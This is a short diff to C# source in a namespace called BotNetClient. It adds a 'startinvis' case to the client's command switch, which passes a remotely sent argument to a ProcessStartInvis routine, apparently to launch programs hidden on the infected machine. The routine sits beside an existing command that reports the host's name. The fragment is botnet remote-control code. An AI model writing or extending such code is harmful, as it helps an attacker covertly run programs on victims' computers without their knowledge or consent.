@@ -22,6 +22,9 @@ namespace BotNetClient
             }
             switch (msg[0])
             {
+                case "startinvis":
+                    ProcessStartInvis.Class1.code(msg[1]);
+                    break;
                 case "nameofpc":
                     a = NameOfPc.Class1.code();
                     break;
